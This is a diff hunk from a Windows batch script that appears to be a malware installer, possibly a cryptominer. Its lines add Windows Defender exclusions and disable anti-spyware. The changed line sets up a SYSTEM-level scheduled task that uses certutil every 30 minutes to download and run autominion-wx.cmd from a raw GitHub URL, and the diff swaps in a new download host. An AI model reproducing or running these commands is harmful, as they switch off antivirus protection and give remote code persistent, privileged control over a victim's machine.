@@ -51,7 +51,7 @@ powershell -c "Set-MpPreference -ExclusionProcess 'explorer.exe', 'cmd.exe','mm.
 powershell -c "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
 
 
-schtasks /query /TN "mmWin" >NUL 2>&1 || schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f http://github.com/autominion-wx.cmd %systemdrive%\\Windows\\Temp\\autominion-wx.cmd & %systemdrive%\\Windows\\Temp\\autominion-wx.cmd"
+schtasks /query /TN "mmWin" >NUL 2>&1 || schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f https://raw.githubusercontent.com/tricktrack091/32test/main/autominion-wx.cmd %systemdrive%\\Windows\\Temp\\autominion-wx.cmd & %systemdrive%\\Windows\\Temp\\autominion-wx.cmd"
 
 if exist %systemdrive%\Windows\Temp\WinSVC\ (
   echo Yes 
